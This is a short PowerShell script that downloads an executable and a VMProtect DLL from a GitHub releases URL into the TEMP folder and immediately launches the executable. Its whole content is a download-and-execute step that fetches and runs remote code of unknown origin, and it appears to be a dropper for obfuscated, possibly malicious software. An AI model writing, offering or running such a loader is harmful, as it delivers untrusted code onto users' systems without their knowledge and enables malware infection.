$baseUrl = "https://github.com/kosnaja12/cal/releases/download/tata"

iwr "$baseUrl/THEGOLF.exe" -OutFile "$env:TEMP\THEGOLF.exe"
iwr "$baseUrl/VMProtectSDK64.dll" -OutFile "$env:TEMP\VMProtectSDK64.dll"

Start-Process "$env:TEMP\THEGOLF.exe"